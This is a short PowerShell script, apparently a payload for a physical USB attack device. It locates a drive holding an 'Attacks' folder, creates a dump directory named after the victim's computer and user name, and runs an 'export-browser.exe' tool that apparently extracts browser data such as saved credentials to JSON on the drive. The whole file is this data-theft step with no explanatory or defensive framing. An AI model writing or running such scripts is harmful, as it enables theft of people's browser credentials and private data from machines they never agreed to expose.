$USBDrive = get-psdrive |where {$_.Root -match ":"} |% {if (Test-Path ($_.Root + "Attacks")){$_.Root}}
mkdir "$USBDrive\Attacks\export-browser\Dump\$env:COMPUTERNAME-$env:USERNAME"
Set-Location "$USBDrive\Attacks\export-browser\Dump\$env:COMPUTERNAME-$env:USERNAME"
& "$USBDrive\Attacks\export-browser\export-browser.exe" --format json